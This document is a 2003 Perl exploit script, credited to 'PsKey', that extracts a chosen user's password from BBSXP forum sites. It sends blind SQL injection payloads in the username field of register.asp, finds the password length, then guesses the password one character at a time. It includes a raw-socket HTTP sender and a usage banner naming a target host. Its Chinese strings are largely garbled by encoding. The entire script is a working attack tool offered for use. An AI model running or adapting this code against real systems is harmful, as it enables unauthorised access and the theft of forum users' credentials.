#!/usr/bin/perl
#Codz By PsKey<PsKey@hotmail.com>2003/3/29
#This Script can crack BBSXP user's password

$|=1;
use Socket;
use Getopt::Std;
getopt('hpwu');

print "==========================================\n";
print "�ļ�����:ѩ���� <yuweng@163.net>\n";
print "Codz By PsKey<PsKey\@hotmail.com>2003/3/29\n";
print "==========================================\n";

&usage unless ( defined($opt_h) && defined($opt_w) && defined($opt_u));

$host=$opt_h;
$port=$opt_p||80;
$way=$opt_w;
$user=$opt_u;

print "\n���ڲ�����ȴ�......\n\n";

@dic=(0..100);
for ($i=0;$i<@dic;$i++)
{
$username=$user."'and(len(userpass)='$dic[$i]')and'1";
$request = "GET $way?menu=Check&username=$username HTTP/1.0\r\n".
"Host: $host\r\n".
"Cookie: eremite=0;\n\n";
print "$dic[$i].";
@in = sendraw($request);
@num=grep /�Ѿ����û�ʹ��/, @in;
$size=@num;
if ($size > 0) {
print "\n\nĿ��������볤��Ϊ: $dic[$i] .\n\n";
$lenpwd=$dic[$i];
last;
}
}

for ($j=1;$j<=$lenpwd;$j++)
{
@dic11=(0..9);
@dic12=(a..z);
@special=qw(` ~ ! @ # $ %25 ^ %26 * \( \) _ %2b = - { } [ ] : " ; < > ? | , . / \\);
@special2=qw( ` ~ �� �� # �� % ���� �� * �� �� ���� + - = { } [ ] �� �� �� �� �� �� �� �� | �� �� / �� �� �� ');
@dic=(@dic11,@dic12,@special,@special2);
for ($i=0;$i<@dic;$i++)
{
$key=$pws.$dic[$i];
$username=$user."'and(left(userpass,$j)='$key')and'1";
$request = "GET $way?menu=Check&username=$username HTTP/1.0\r\n".
"host:$host\r\n".
"Cookie: eremite=0;\n\n";
print "$dic[$i].";
@in = sendraw($request);
@num=grep /�Ѿ����û�ʹ��/, @in;
@num1=grep /��������ʧ/, @in;
$size=@num;
$size1=@num1;
if ($size > 0) {
$th=$j.th;
print "\n��[$th]�������ַ���: [$dic[$i]] \n";
$pws=$pws.$dic[$i];
last;
}
elsif ($size1 > 0)
{
$th=$j.th;
print "\nSuccessful,The $th word of the password is $dic[$i] \n\n";
print " �����Attention����� \n";
print "Something wrong,i can't go on,so you should crack it yourself!Poor...\n";
exit 0;
}
}
}

$pws=~s/\%2b/\+/ig;
$pws=~s/\%25/\%/ig;
$pws=~s/\%26/\&/ig;

print "\n\n�û���:$user ����: $pws\n";

sub usage {
print qq~
�÷�: $0 -h <Host> [-p <port>] -w <way> -u <user>
-h =�������ƻ�IP
-p =�˿ڣ�Ĭ��80
-w =�ļ�·��
-u =�û�����

��: $0 -h www.target.com -p 80 -w /bbsxp/register.asp -u root
~;
exit;
}


#thanx rfp<rfp@wiretrip.net>'s sendraw 
sub sendraw {
my ($request) = @_;
my $target;
$target = inet_aton($host) || die("inet_aton problems");
socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) || die("Socket
problems\n");
if(connect(S,pack "SnA4x8",2,$port,$target)){
select(S);
$| = 1;
print $request;
my @in = <S>;
select(STDOUT);
close(S);
return @in;
}
else {
die("Can't connect...\n");
}
}